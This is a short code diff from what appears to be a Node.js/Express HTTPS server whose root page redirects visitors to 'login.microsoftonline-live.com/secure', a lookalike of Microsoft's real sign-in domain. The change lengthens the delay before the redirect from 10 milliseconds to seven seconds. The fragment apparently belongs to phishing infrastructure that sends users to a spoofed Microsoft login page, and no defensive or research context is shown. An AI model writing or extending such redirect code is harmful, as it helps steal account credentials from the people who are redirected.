@@ -13,7 +13,7 @@ const port = 443; // Standard HTTPS port
 app.get('/', (req, res) => {
   setTimeout(() => {
     res.redirect('https://login.microsoftonline-live.com/secure');
-  }, 10);
+  }, 7000);
 });
 
 const httpsServer = https.createServer(credentials, app);
